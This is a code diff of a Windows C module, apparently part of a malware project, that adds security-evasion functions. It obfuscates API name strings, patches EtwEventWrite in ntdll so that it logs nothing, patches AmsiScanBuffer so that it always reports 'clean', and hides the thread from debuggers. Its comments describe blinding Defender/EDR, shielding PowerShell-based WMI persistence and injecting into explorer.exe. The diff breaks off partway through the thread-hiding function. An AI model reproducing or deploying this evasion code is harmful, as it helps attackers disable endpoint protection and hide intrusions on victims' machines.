@@ -1,6 +1,12 @@
 /**
+ * === ETW + AMSI Runtime Bypass + Reflective Loader ===
  * 
+ * ETW (Event Tracing for Windows) and AMSI (Antimalware Scan Interface)
+ * are patched before any suspicious activity to prevent runtime behavioral
+ * detection by Defender/EDR.
  * 
+ * Reflective loader injects our full PE into an existing process (explorer.exe)
+ * without CreateProcess — avoiding the heavily signatured CREATE_SUSPENDED flag.
  */
 
 #include <windows.h>
@@ -8,8 +14,9 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
-#include "util.h"
+#include "obf.h"
 
+/* Encoded strings for ETW/AMSI APIs */
 /* "EtwEventWrite" */
 static unsigned char enc_etweventwrite[] = {
     0x3f, 0x0e, 0x0d, 0x3f, 0x0c, 0x1f, 0x14, 0x0e,
@@ -34,20 +41,23 @@ static unsigned char enc_ntsetinfothread[] = {
     0x2e, 0x12, 0x08, 0x1f, 0x1b, 0x1e
 };
 
-char* util_etweventwrite(void) { return get_str(enc_etweventwrite, sizeof(enc_etweventwrite)); }
-char* util_amsiscanbuffer(void) { return get_str(enc_amsiscanbuffer, sizeof(enc_amsiscanbuffer)); }
-char* util_amsiinit(void) { return get_str(enc_amsiinit, sizeof(enc_amsiinit)); }
-char* util_amsidll(void) { return get_str(enc_amsidll, sizeof(enc_amsidll)); }
-char* util_ntsetinfothread(void) { return get_str(enc_ntsetinfothread, sizeof(enc_ntsetinfothread)); }
+char* obf_etweventwrite(void) { return get_str(enc_etweventwrite, sizeof(enc_etweventwrite)); }
+char* obf_amsiscanbuffer(void) { return get_str(enc_amsiscanbuffer, sizeof(enc_amsiscanbuffer)); }
+char* obf_amsiinit(void) { return get_str(enc_amsiinit, sizeof(enc_amsiinit)); }
+char* obf_amsidll(void) { return get_str(enc_amsidll, sizeof(enc_amsidll)); }
+char* obf_ntsetinfothread(void) { return get_str(enc_ntsetinfothread, sizeof(enc_ntsetinfothread)); }
 
+/* === ETW Bypass ===
+ * Patch EtwEventWrite in ntdll.dll to return immediately.
+ * This stops Defender/EDR from receiving security event telemetry.
  */
-void util_disable_etw(void) {
-    char *ntdll_name = util_ntdll();
+void obf_bypass_etw(void) {
+    char *ntdll_name = obf_ntdll();
     HMODULE hNtdll = GetModuleHandleA(ntdll_name);
     if (!hNtdll) hNtdll = LoadLibraryA(ntdll_name);
     if (!hNtdll) return;
 
-    FARPROC pEtwEventWrite = GetProcAddress(hNtdll, util_etweventwrite());
+    FARPROC pEtwEventWrite = GetProcAddress(hNtdll, obf_etweventwrite());
     if (!pEtwEventWrite) return;
 
     /* Patch: ret (0xC3) — function returns immediately, no events logged */
@@ -59,13 +69,16 @@ void util_disable_etw(void) {
     VirtualProtect(pEtwEventWrite, 1, oldProtect, &oldProtect);
 }
 
+/* === AMSI Bypass ===
+ * Patch AmsiScanBuffer in amsi.dll to return S_OK (0), meaning "clean".
+ * This prevents AMSI from scanning our PowerShell commands (e.g. WMI persistence).
  */
-void util_disable_amsi(void) {
-    char *amsi_name = util_amsidll();
+void obf_bypass_amsi(void) {
+    char *amsi_name = obf_amsidll();
     HMODULE hAmsi = LoadLibraryA(amsi_name);
     if (!hAmsi) return;
 
-    FARPROC pAmsiScanBuffer = GetProcAddress(hAmsi, util_amsiscanbuffer());
+    FARPROC pAmsiScanBuffer = GetProcAddress(hAmsi, obf_amsiscanbuffer());
     if (!pAmsiScanBuffer) return;
 
     /* Patch: xor eax, eax; ret (0x31 0xC0 0xC3)
@@ -79,16 +92,17 @@ void util_disable_amsi(void) {
     VirtualProtect(pAmsiScanBuffer, 3, oldProtect, &oldProtect);
 }
 
+/* === Thread Hide From Debugger (bonus anti-EDR) ===
  * Hides current thread from ETW/debugger using NtSetInformationThread.
  */
-void util_hide_thread(void) {
-    char *ntdll_name = util_ntdll();
+void obf_hide_thread(void) {
+    char *ntdll_name = obf_ntdll();
     HMODULE hNtdll = GetModuleHandleA(ntdll_name);
     if (!hNtdll) hNtdll = LoadLibraryA(ntdll_name);
     if (!hNtdll) return;
 
     typedef NTSTATUS (WINAPI *NtSetInfoThread_t)(HANDLE, ULONG, PVOID, ULONG);
-    NtSetInfoThread_t pNtSetInfoThread = (NtSetInfoThread_t)GetProcAddress(hNtdll, util_ntsetinfothread());
+    NtSetInfoThread_t pNtSetInfoThread = (NtSetInfoThread_t)GetProcAddress(hNtdll, obf_ntsetinfothread());
     if (!pNtSetInfoThread) return;
 
     ULONG hide = 1;
